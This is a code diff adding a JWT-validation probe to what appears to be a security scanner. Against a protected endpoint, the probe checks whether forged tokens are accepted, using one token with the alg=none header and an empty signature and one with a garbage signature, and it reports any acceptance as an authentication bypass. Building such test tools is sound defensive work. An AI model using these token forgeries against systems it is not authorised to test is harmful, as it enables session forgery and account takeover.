@@ -52,6 +52,95 @@ def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
     return (signing_input + b"." + sig).decode()
 
 
+def _b64url_decode(seg: str) -> bytes:
+    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))
+
+
+def _jwt_payload_segment(token: str):
+    """(parts, payload_dict) for a well-formed JWT, else None."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        return parts, json.loads(_b64url_decode(parts[1]))
+    except Exception:
+        return None
+
+
+def jwt_flaws_probe(model, base_url: str, *, session: requests.Session | None = None,
+                    auth: dict | None = None) -> list[ProbeFinding]:
+    """
+    Deep JWT-validation flaws, proven with a CONTROL. Needs a VALID token (supplied
+    or self-registered) and a protected endpoint where valid→2xx and no-token→401.
+    Then it tampers the valid token and checks the endpoint still accepts it:
+      • header alg=none + empty signature accepted → the algorithm isn't enforced (P1).
+      • a garbage signature accepted → the signature isn't verified at all (P1).
+    A correct server (algorithms=[HS256], signature+exp checked) rejects both → quiet.
+    No secret needed — this catches bugs forge-jwt (which needs a leaked secret) can't.
+    """
+    sess = session or requests.Session()
+    from core.auth_recipe import derive_auth_recipe
+    recipe = derive_auth_recipe(model)
+    base = base_url.rstrip("/")
+    out: list[ProbeFinding] = []
+
+    target = next((str(e.get("path")) for e in getattr(model, "endpoints", [])
+                   if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
+                   and e.get("auth_required") and "{" not in str(e.get("path", ""))), None)
+    target = target or recipe.get("identity_path")
+    if not target:
+        return out
+    token = _resolve_token(sess, base, recipe, model, f"jwtf_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
+    if not token:
+        return out
+    url = f"{base}{target}"
+
+    def code_with(tok):
+        try:
+            return sess.get(url, headers=_auth_headers(tok, auth), timeout=15).status_code
+        except Exception:
+            return None
+
+    try:
+        s_notoken = sess.get(url, timeout=15).status_code
+    except Exception:
+        return out
+    s_valid = code_with(token)
+    # Controls: the valid token must work AND the endpoint must reject no token.
+    if not (isinstance(s_valid, int) and 200 <= s_valid < 300):
+        return out
+    if s_notoken not in (401, 403):
+        return out
+
+    parsed = _jwt_payload_segment(token)
+    if not parsed:
+        return out
+    parts = parsed[0]
+
+    none_header = _b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()).decode()
+    alg_none = f"{none_header}.{parts[1]}."
+    c = code_with(alg_none)
+    if isinstance(c, int) and 200 <= c < 300:
+        out.append(ProbeFinding(
+            probe="jwt-flaws", title=f"JWT alg=none accepted — authentication bypass on GET {target}",
+            exploited=True, severity="P1",
+            evidence=(f"A token with header alg=none and NO signature was accepted (HTTP {c}, same as a "
+                      f"valid token; no token → {s_notoken}). The server does not enforce the signing "
+                      f"algorithm — anyone can forge a valid session."),
+            target=target))
+
+    tampered = f"{parts[0]}.{parts[1]}.{'A' * max(10, len(parts[2]))}"
+    c = code_with(tampered)
+    if isinstance(c, int) and 200 <= c < 300:
+        out.append(ProbeFinding(
+            probe="jwt-flaws", title=f"JWT signature not verified — any token forgeable on GET {target}",
+            exploited=True, severity="P1",
+            evidence=(f"A token with a garbage signature was accepted (HTTP {c}; no token → {s_notoken}). "
+                      f"The server does not verify the signature — tokens can be forged at will."),
+            target=target))
+    return out
+
+
 def _jwt_algorithm(model) -> str:
     """Read the JWT algorithm from the model's config, defaulting to HS256."""
     for c in getattr(model, "config", []):
